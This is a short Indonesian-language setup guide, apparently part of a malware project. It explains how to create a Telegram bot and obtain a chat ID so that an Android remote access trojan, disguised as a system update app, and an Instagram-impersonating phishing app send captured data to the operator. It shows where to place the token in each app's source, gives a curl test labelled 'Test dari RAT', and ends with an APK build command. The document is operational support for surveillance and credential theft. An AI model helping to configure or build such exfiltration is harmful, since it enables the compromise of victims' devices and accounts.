# 📱 Setup Telegram Bot untuk Menerima Data

## Step 1: Buat Bot Telegram

1. Buka Telegram dan cari **@BotFather**
2. Kirim command: `/newbot`
3. BotFather akan tanya nama bot, contoh: `MyDataBot`
4. BotFather akan tanya username bot (harus diakhiri 'bot'), contoh: `mydata_receiver_bot`
5. BotFather akan kasih **Bot Token**, contoh:
   ```
   1234567890:ABCdefGHIjklMNOpqrsTUVwxyz123456789
   ```
6. **SAVE TOKEN INI** - kamu perlu edit di code

## Step 2: Dapatkan Chat ID

1. Cari **@userinfobot** di Telegram
2. Klik Start atau kirim pesan apa saja
3. Bot akan reply dengan info kamu, termasuk **Chat ID**
4. Chat ID biasanya angka, contoh: `987654321`
5. **SAVE CHAT ID INI** - kamu perlu edit di code

## Step 3: Start Bot

1. Buka chat dengan bot yang kamu buat tadi (username yang kamu pilih)
2. Klik **Start** atau kirim `/start`
3. Bot siap menerima data!

## Step 4: Edit Token di Code

### Untuk RAT:
```bash
nano AndroidRAT/app/src/main/java/com/systemupdate/manager/MainActivity.java
```

Cari line 29-30 dan ganti:
```java
private static final String TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHI..."; // TOKEN KAMU
private static final String TELEGRAM_CHAT_ID = "987654321"; // CHAT ID KAMU
```

### Untuk Phishing:
```bash
nano AndroidPhishing/app/src/main/java/com/instagram/login/MainActivity.java
```

Cari line 18-19 dan ganti:
```java
private static final String TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHI..."; // TOKEN KAMU
private static final String TELEGRAM_CHAT_ID = "987654321"; // CHAT ID KAMU
```

## Step 5: Test Bot

Kirim test message via curl:
```bash
curl -X POST "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{"chat_id":"<CHAT_ID>","text":"Test dari RAT"}'
```

Jika berhasil, kamu akan terima pesan di Telegram!

---

## Troubleshooting

**Q: Bot tidak terima pesan?**
- Pastikan bot sudah di-start (`/start` di chat bot)
- Pastikan token dan chat ID benar
- Cek koneksi internet

**Q: Error 401 Unauthorized?**
- Token salah, cek lagi dari BotFather

**Q: Error 400 Bad Request?**
- Chat ID salah, atau bot belum di-start

---

Setelah setup Telegram, baru build APK dengan:
```bash
cd /root/workspace/7554333225
./build.sh
```
